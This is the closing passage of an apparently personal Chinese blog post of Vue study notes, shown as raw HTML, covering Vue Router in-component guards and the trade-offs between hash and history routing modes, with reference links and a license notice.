</code></pre></div></div></li><li><p>组件内守卫：</p><div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">//进入守卫：通过路由规则，进入该组件时被调用</span>
<span class="nx">beforeRouteEnter</span> <span class="p">(</span><span class="nx">to</span><span class="p">,</span> <span class="k">from</span><span class="p">,</span> <span class="nx">next</span><span class="p">)</span> <span class="p">{</span>
<span class="p">},</span>
<span class="c1">//离开守卫：通过路由规则，离开该组件时被调用</span>
<span class="nx">beforeRouteLeave</span> <span class="p">(</span><span class="nx">to</span><span class="p">,</span> <span class="k">from</span><span class="p">,</span> <span class="nx">next</span><span class="p">)</span> <span class="p">{</span>
<span class="p">}</span>
</code></pre></div></div></li></ol><h2 id="413-路由器的两种工作模式">4.13 路由器的两种工作模式</h2><ol><li><p>对于一个url来说，什么是hash值？—— #及其后面的内容就是hash值。</p></li><li><p>hash值不会包含在 HTTP 请求中，即：hash值不会带给服务器。</p></li><li><p>hash模式：</p><ol><li>地址中永远带着#号，不美观 。</li><li>若以后将地址通过第三方手机app分享，若app校验严格，则地址会被标记为不合法。</li><li>兼容性较好。</li></ol></li><li><p>history模式：</p><ol><li>地址干净，美观 。</li><li>兼容性和hash模式相比略差。</li><li>应用部署上线时需要后端人员支持，解决刷新页面服务端404的问题。</li></ol></li></ol><p>参考文章：</p><ol><li>尚硅谷主讲的vue：https://www.bilibili.com/video/BV1Zy4y1K7SH?p=77&amp;spm_id_from=pageDriver</li><li>现代JavaScript：https://zh.javascript.info/</li><li>MDN文档：https://developer.mozilla.org/zh-CN/docs/Web</li><li>我是你的超级英雄 https://juejin.cn/post/6844903895467032589</li></ol><div style="margin-top:2em;padding:0 1.5em;border:1px solid #d3d3d3;background-color:#deebf7"><h3>文档信息</h3><ul><li>本文作者：<a href="https://github.com/Leeark" target="_blank">Menghao Li</a></li><li>本文链接：<a href="https://github.com/Leeark/2022/09/04/vue-summary/" target="_blank">https://github.com/Leeark/2022/09/04/vue-summary/</a></li><li>版权声明：自由转载-非商用-非衍生-保持署名（<a href="http://creativecommons.org/licenses/by-nc-nd/3.0/deed.zh" target="_blank">创意共享3.0许可证</a>）</li></ul></div></article><div class="share"></div><div class="comment"> <script src="https://beaudar.lipk.org/client.js" repo="mzlogin/blog-comments" issue-term="title" label="gitment" theme="github-light" comment-order="desc" input-position="top" crossorigin="anonymous" async> </script></div></div><div class="column one-fourth"><h3>Search</h3><div id="site_search"> <input style="width:96%" type="text" id="search_box" placeholder="Search"></div><ul id="search_results" style="font-size:14px;list-style-type:none;padding-top:10px;padding-left:10px;"></ul><script src="https://github.com/Leeark/assets/js/simple-jekyll-search.min.js"></script> <script type="text/javascript"> SimpleJekyllSearch({ searchInput: document.getElementById('search_box'), resultsContainer: document.getElementById('search_results'), json: 'https://github.com/Leeark/assets/search_data.json?v=1662356589', searchResultTemplate: '<li><a href="{url}" title="{title}">{title}</a></li>', noResultsText: 'No results found', limit: 10, fuzzy: false, exclude: ['Welcome'] }) </script><h3 class="post-directory-title mobile-hidden">Table of Contents</h3><div id="post-directory-module" class="mobile-hidden"><section class="post-directory"><dl></dl></section></div><script src="https://github.com/Leeark/assets/js/jquery.toc.js"></script></div></div></section><footer class="container"><div class="site-footer" role="contentinfo"><div class="copyright left mobile-block"> © 2015 <span title="Menghao Li">Menghao Li</span> <a href="javascript:window.scrollTo(0,0)" class="right mobile-visible">TOP</a></div><ul class="site-footer-links right mobile-hidden"><li> <a href="javascript:window.scrollTo(0,0)" >TOP</a></li></ul><a href="https://github.com/Leeark/Leeark.github.io" target="_blank" aria-label="view source code"> <span class="mega-octicon octicon-mark-github" title="GitHub"></span> </a><ul class="site-footer-links mobile-hidden"><li> <a href="https://github.com/Leeark/" title="首页" target="">首页</a></li><li> <a href="https://github.com/Leeark/categories/" title="分类" target="">分类</a></li><li> <a href="https://github.com/Leeark/wiki/" title="维基" target="">维基</a></li><li> <a href="https://github.com/Leeark/links/" title="链接" target="">链接</a></li><li> <a href="https://github.com/Leeark/about/" title="关于" target="">关于</a></li><li><a href="https://github.com/Leeark/feed.xml"><span class="octicon octicon-rss" style="color:orange;"></span></a></li></ul></div></footer><div class="tools-wrapper"> <a class="gotop" href="#" title="回到顶部"><span class="octicon octicon-arrow-up"></span></a></div><script src="https://github.com/Leeark/assets/js/geopattern.js"></script> <script> jQuery(document).ready(function($) { $('.geopattern').each(function(){ $(this).geopattern($(this).data('pattern-id')); }); /* hljs.initHighlightingOnLoad(); */ }); </script></body></html>
